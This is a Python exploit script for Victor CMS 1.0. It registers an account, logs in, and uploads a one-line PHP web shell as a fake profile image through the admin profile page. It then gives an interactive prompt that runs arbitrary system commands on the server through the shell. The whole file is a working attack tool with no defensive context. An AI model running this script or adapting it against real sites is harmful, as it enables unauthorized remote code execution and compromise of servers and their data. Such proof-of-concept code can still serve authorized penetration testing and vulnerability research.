import argparse
import requests
from random import randint

def register_user(REG_URL):   

    REG_HEADERS   = {'Content-Type': 'application/x-www-form-urlencoded'}
    REG_DATA      = {'user_name':'user', 
                     'user_password':'password', 
                     'register':''} 
    
    response = requests.post(REG_URL, 
                        headers = REG_HEADERS, 
                        data = REG_DATA,
                        allow_redirects = False)
    
    if response.status_code == 302:
        return True
    else:
        return False

def upload_shell(URL):
    LOG_DATA      = {'user_name':'user',
                     'user_password':'password', 
                     'login':''} 
    LOG_URL       = URL+'index.php'
    UPL_URL       = URL+'admin/profile.php?section=python666'       
    BOUNDARY      = gen_boundary(27, 29)
    UPL_HEADERS   = {'Content-Type':f'multipart/form-data; boundary={BOUNDARY}'}
    SHELL         = "<?php system($_GET['cmd']);?>"

    with requests.Session() as sess:        
        
        response=sess.post(LOG_URL, data = LOG_DATA)
        if response.status_code != 200 :
            return 2
        
        data = encode_multipart_formdata_addfile(SHELL,BOUNDARY)  
        sess.headers = UPL_HEADERS
        response = sess.post(UPL_URL, data=data)
        if response.status_code == 200 :
            return 0
        else:
            return 1


def encode_multipart_formdata_addfile(file_content, BOUNDARY):
    
    body     =  ("--%s\r\nContent-Disposition: form-data; name=\"user_image\"; "
                "filename=\"shell.php\"\r\nContent-Type: application/x-php"
                "\r\n\r\n"
                "%s\r\n\r\n--%s--" % (BOUNDARY,file_content,BOUNDARY)
                )         
    
    return body

def gen_boundary(dashes, numbers):
    
    return '-'*dashes + ''.join(["{}".format(randint(0, 9)) for num in range(0, numbers)])

def run_command(command, URL):  
    
    SHL_URL = URL +'img/shell.php?cmd='  
    response = requests.get(SHL_URL+command)
    print(response.text)    

def main():
    
    print('Victor CMS 1.0 - File Upload To RCE')
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="Path to register.php (Example: http://localhost/CMSsite-master/register.php)")
    args = parser.parse_args()
    
    print(f'[x]URL: {args.url}')  

    print('[x] User registration...')    

    if not register_user(args.url):
        print('\t[!] Registration failed!')
        return

    print('\t[->] Done')

    url = args.url.split('register.php')[0]

    print('[x] Loading a shell...')
    
    result = upload_shell(url)
    if result == 2:
        print('\t[!] Authorization failed!')
        return
    elif result == 1:
        print('\t[!] Loading failed!')
        return

    print('\t[->] Done')

    print('[x] Input the command (or "EXIT")')

    while True:            
        command = input('[c->]')
        if command == 'EXIT':
            print('[x] Bye!..')
            return
        run_command(command, url)    
           
if __name__ == '__main__':
    main()

